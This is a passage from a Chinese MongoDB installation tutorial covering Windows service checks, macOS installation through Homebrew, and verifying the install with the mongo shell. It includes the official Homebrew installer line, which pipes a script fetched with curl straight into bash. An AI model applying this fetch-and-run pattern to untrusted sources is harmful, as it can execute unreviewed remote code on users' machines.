<h4 data-id="heading-12">4. 启动MongoDB服务</h4>
<p>MongoDB安装程序默认会将MongoDB作为Windows服务安装和启动。你可以通过以下命令检查MongoDB服务的状态：</p>
<pre><code class="hljs language-cmd" lang="cmd">sc query MongoDB
</code></pre>
<h4 data-id="heading-13">5. 启动MongoDB shell</h4>
<p>在命令提示符中输入以下命令启动MongoDB shell：</p>
<pre><code class="hljs language-cmd" lang="cmd">mongo
</code></pre>
<h3 data-id="heading-14">在macOS上安装MongoDB</h3>
<h4 data-id="heading-15">1. 使用Homebrew安装MongoDB</h4>
<p>如果还没有安装Homebrew，可以通过以下命令安装：</p>
<pre><code class="hljs language-bash" lang="bash">/bin/bash -c <span class="hljs-string">"<span class="hljs-subst">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)</span>"</span>
</code></pre>
<p>接下来，使用Homebrew安装MongoDB：</p>
<pre><code class="hljs language-bash" lang="bash">brew tap mongodb/brew
brew install mongodb-community@5.0
</code></pre>
<h4 data-id="heading-16">2. 启动MongoDB服务</h4>
<pre><code class="hljs language-bash" lang="bash">brew services start mongodb/brew/mongodb-community
</code></pre>
<h4 data-id="heading-17">3. 验证MongoDB服务是否启动</h4>
<pre><code class="hljs language-bash" lang="bash">ps aux | grep -v grep | grep mongod
</code></pre>
<h4 data-id="heading-18">4. 启动MongoDB shell</h4>
<pre><code class="hljs language-bash" lang="bash">mongo
</code></pre>
<h3 data-id="heading-19">验证安装</h3>
<p>无论在何种操作系统上安装MongoDB，都可以通过启动MongoDB shell来验证安装是否成功：</p>
<pre><code class="hljs language-bash" lang="bash">mongo
</code></pre>
<p>在MongoDB shell中，可以执行以下命令查看MongoDB版本，确认安装成功：</p>
<pre><code class="hljs language-javascript" lang="javascript">db.<span class="hljs-title function_">version</span>()
</code></pre>
<h3 data-id="heading-20">总结</h3>
<p>无论是在Ubuntu、Windows还是macOS上，安装MongoDB的过程都较为简单。以下是安装MongoDB的总体步骤：</p>
<ol>
<li><strong>下载并安装MongoDB</strong>：根据操作系统选择合适的安装方法。</li>
<li><strong>启动MongoDB服务</strong>：确保MongoDB服务已启动。</li>
<li><strong>验证安装</strong>：通过启动MongoDB shell并检查MongoDB版本来验证安装是否成功。</li>
</ol>
<p>通过以上详细步骤和代码示例，可以顺利在不同操作系统上安装和配置MongoDB，并开始使用MongoDB进行数据管理和操作。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>